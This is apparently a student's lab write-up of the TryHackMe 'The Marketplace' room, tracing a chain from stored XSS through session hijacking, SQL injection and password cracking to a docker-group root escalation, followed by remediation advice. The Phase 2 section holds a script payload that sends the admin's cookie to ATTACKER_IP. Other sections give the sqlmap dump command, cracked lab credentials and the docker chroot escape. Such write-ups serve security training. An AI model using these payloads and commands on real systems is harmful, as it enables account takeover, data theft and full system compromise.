# Week 3: Advanced VAPT Exercise - XSS to RCE Chain Exploitation

## 📋 Overview
Advanced exploitation exercise demonstrating a complete attack chain from Cross-Site Scripting (XSS) to Remote Code Execution (RCE) and privilege escalation to root access on TryHackMe's "The Marketplace" challenge.

**Date:** January 09, 2026   
**Target:** TryHackMe - The Marketplace   
**Status:** ✅ Completed

---

## 🎯 Objectives Completed

- ✅ Exploit chain development (XSS → SQLi → Privilege Escalation)
- ✅ Web application penetration testing
- ✅ Post-exploitation and evidence collection
- ✅ Professional reporting and stakeholder communication
- ✅ Vulnerability assessment and remediation planning

---

## 🛠️ Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| Nmap | 7.93 | Port scanning and enumeration |
| Burp Suite | Community 2023 | Web proxy and XSS testing |
| SQLMap | 1.7 | SQL injection exploitation |
| Python HTTP Server | 3.11 | Cookie capture listener |
| John the Ripper | 1.9.0 | Password hash cracking |
| Docker | 20.10 | Privilege escalation |
| tcpdump | 4.99 | Network traffic capture |

---

## 🔗 Attack Chain Summary
```
Anonymous User 
    ↓ (Register Account)
Registered User (testuser)
    ↓ (Stored XSS - Cookie Theft)
Administrator (michael)
    ↓ (SQL Injection - Database Dump)
SSH User (jake)
    ↓ (Docker Group Privilege Escalation)
Root Access (Complete Compromise)
```

---

## 📊 Vulnerability Summary

| ID | Vulnerability | CVSS | Severity | Status |
|----|---------------|------|----------|--------|
| F001 | Stored XSS | 7.1 | High | Exploited |
| F002 | Session Hijacking | 8.2 | High | Exploited |
| F003 | SQL Injection | 9.1 | Critical | Exploited |
| F004 | Weak Passwords | 6.5 | Medium | Exploited |
| F005 | Docker Privilege Escalation | 7.8 | High | Exploited |

---

## 🚀 Step-by-Step Exploitation Workflow

### Phase 1: Reconnaissance
```bash
# Port scanning
nmap -sV -sC 10.10.x.x

# Results:
# Port 22: SSH (OpenSSH 7.6p1)
# Port 80: HTTP (nginx 1.19.2)
# Port 32768: HTTP (Node.js)
```

### Phase 2: XSS Exploitation
```javascript
// 1. Register account: testuser
// 2. Create new listing with XSS payload:
<script>document.location='http://ATTACKER_IP:8000/?c='+document.cookie</script>

// 3. Setup listener:
python3 -m http.server 8000

// 4. Report listing to admin
// 5. Capture admin cookie when admin reviews listing
```

**Result:** ✅ Admin JWT token captured

![XSS Cookie Capture](Screenshots/cookie_capture.png)

---

### Phase 3: Session Hijacking
```bash
# Replace session cookie in browser with captured admin token
# Access admin panel: http://10.10.x.x/admin
```

**Result:** ✅ Administrative access achieved

![Admin Access](Screenshots/admin_access.png)

---

### Phase 4: SQL Injection
```bash
# Test for SQL injection in admin panel
# URL: http://10.10.x.x/admin?user=1

# Automated exploitation with SQLMap:
sqlmap -u "http://10.10.x.x/admin?user=1" \
       --cookie="token=[ADMIN_TOKEN]" \
       --dump

# Extract user credentials from database
```

**Result:** ✅ 4 user password hashes extracted

---

### Phase 5: Password Cracking
```bash
# Save hashes to file
cat > hashes.txt << EOF
$2b$10$yaYKN53QQ6ZvPzHGzupWa.wMlHrO0uk5Qv0v5dYMgqq9kqG7NQ3l6
EOF

# Crack with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=bcrypt

# Cracked: jake:@jake@1234
```

**Result:** ✅ SSH credentials obtained

---

### Phase 6: SSH Access
```bash
# Login via SSH
ssh jake@10.10.x.x
Password: @jake@1234

# Retrieve user flag
cat ~/user.txt
```

**Result:** ✅ User-level access achieved

![SSH Access](Screenshots/ssh_access.png)

---

### Phase 7: Privilege Escalation
```bash
# Check user groups
id
# Output: groups=1002(jake),999(docker)

# Exploit docker group membership
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Verify root access
id
# Output: uid=0(root) gid=0(root)

# Retrieve root flag
cat /root/root.txt
```

**Result:** ✅ Root access achieved

![Docker Escape](Screenshots/docker_escape.png)

---

## 📸 Evidence Collection

All evidence collected with proper chain of custody:

| Item | Hash (SHA256) | Date |
|------|---------------|------|
| marketplace_exploit.pcap | 8f3d9e2a...9e0f | 2025-01-09 |
| admin_token.txt | 2b7e1516...0cfe | 2025-01-09 |
| database_dump.sql | 1f2e3d4c...1807 | 2025-01-09 |
| escalation_log.txt | 9e8d7c6b...9e8 | 2025-01-09 |


---

## 📈 Exploitation Timeline
```
09:00 - Initial reconnaissance (Nmap scan)
09:30 - Web application enumeration
10:00 - XSS payload injection
10:05 - Admin cookie captured
10:08 - Session hijacking successful
10:30 - SQL injection exploitation
10:40 - Database credentials extracted
10:50 - Password cracking completed
11:00 - SSH access obtained
11:10 - Root access via Docker escape
11:30 - Evidence collection completed
12:00 - Documentation finalized
```

---

## 🛡️ Remediation Summary

### Critical Fixes (48-72 hours)
1. **XSS Prevention:** Implement input sanitization with DOMPurify
2. **SQL Injection Fix:** Use parameterized queries/prepared statements
3. **Session Security:** Add HttpOnly and Secure flags to cookies
4. **Docker Access:** Remove users from docker group

---

## 📚 Key Learnings

### Technical Skills
- Multi-stage exploit chaining
- Web application vulnerability assessment
- Linux privilege escalation techniques
- Professional security reporting

### Methodologies Applied
- PTES (Penetration Testing Execution Standard)
- OWASP Testing Guide
- Proper evidence collection and chain of custody
- Stakeholder communication best practices

---

## 📄 Documentation

**Complete Report:**

The full PDF report contains:
- Executive summary for management
- Detailed technical findings
- CVSS vulnerability scoring
- Comprehensive remediation plan
- Stakeholder communication samples

---

## 🔗 References

- [TryHackMe - The Marketplace](https://tryhackme.com/room/marketplace)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PTES Technical Guidelines](http://www.pentest-standard.org/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [GTFOBins - Docker](https://gtfobins.github.io/gtfobins/docker/)

---




